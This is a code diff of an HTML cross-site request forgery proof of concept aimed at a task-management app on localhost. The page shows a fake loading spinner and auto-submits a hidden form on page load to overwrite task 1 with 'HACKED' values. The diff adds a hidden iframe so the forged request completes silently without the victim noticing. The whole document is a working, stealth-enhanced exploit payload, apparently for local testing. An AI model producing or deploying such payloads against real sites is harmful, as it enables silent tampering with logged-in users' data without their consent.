@@ -14,9 +14,7 @@
             margin: 0;
             color: #333;
         }
-        .loader-container {
-            text-align: center;
-        }
+        .loader-container { text-align: center; }
         .spinner {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #3498db;
@@ -29,7 +27,6 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<!-- THE MAGIC: Auto-submit the form the exact millisecond the page loads -->
 <body onload="document.getElementById('csrf-form').submit();">
 
     <div class="loader-container">
@@ -38,9 +35,10 @@
         <div class="spinner"></div>
     </div>
 
-    <!-- THE CSRF PAYLOAD -->
-    <!-- Change the action URL to a valid task ID owned by the logged-in victim (e.g., task ID 1) -->
-    <form id="csrf-form" action="http://localhost:5000/tasks/1/edit" method="POST">
+    <!-- THE FIX: Hidden iframe to catch the response so the browser stays on this page -->
+    <iframe name="silent_frame" style="display: none;"></iframe>
+
+    <form id="csrf-form" action="http://localhost:5000/tasks/1/edit" method="POST" target="silent_frame">
         <input type="hidden" name="title" value="HACKED - CSRF SUCCESS">
         <input type="hidden" name="description" value="This task was silently sabotaged via a zero-click auto-loading CSRF attack.">
         <input type="hidden" name="status" value="done">
